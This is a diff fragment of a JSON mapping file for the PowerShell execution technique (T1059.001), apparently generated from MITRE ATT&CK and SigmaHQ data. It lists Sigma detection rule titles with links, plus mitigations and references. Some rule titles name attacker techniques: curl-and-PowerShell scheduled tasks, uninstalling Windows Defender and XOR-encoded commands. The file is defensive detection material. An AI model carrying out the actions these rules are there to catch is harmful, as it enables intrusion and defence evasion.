+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_snapins_hafnium.yml"
+      },
+      {
+        "title": "Stop Windows Service Via PowerShell Stop-Service",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_stop_service.yml"
+      },
+      {
+        "title": "Suspicious PowerShell Parameter Substring",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml"
+      },
+      {
+        "title": "Suspicious PowerShell Parent Process",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_susp_parent_process.yml"
+      },
+      {
+        "title": "PowerShell Script Run in AppData",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_susp_ps_appdata.yml"
+      },
+      {
+        "title": "Suspicious Uninstall of Windows Defender Feature via PowerShell",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_uninstall_defender_feature.yml"
+      },
+      {
+        "title": "User Discovery And Export Via Get-ADUser Cmdlet",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_user_discovery_get_aduser.yml"
+      },
+      {
+        "title": "Net WebClient Casing Anomalies",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_webclient_casing.yml"
+      },
+      {
+        "title": "Suspicious XOR Encoded PowerShell Command",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_xor_commandline.yml"
+      },
+      {
+        "title": "Scheduled Task Creation with Curl and PowerShell Execution Combo",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml"
+      },
+      {
+        "title": "Always Install Elevated MSI Spawned Cmd And Powershell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_elavated_msi_spawned_shell.yml"
+      },
+      {
+        "title": "Hidden Powershell in Link File Pattern",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_embed_exe_lnk.yml"
+      },
+      {
+        "title": "Non-privileged Usage of Reg or Powershell",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_non_priv_reg_or_ps.yml"
+      },
+      {
+        "title": "Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmiprvse_spawns_powershell.yml"
+      }
+    ],
+    "related_sigma_rules": 173,
+    "other_rules": []
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.001"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1059.001"
+    },
+    {
+      "id": "M1049",
+      "name": "Antivirus/Antimalware",
+      "technique": "T1059.001"
+    },
+    {
+      "id": "M1045",
+      "name": "Code Signing",
+      "technique": "T1059.001"
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1059.001"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/techniques/T1059/001",
+    "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/HonorableMentions/PowerShell.yml",
+    "https://strontic.github.io/xcyclopedia/library/powershell.exe-04029E121A0CFA5991749937DD22A1D9.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
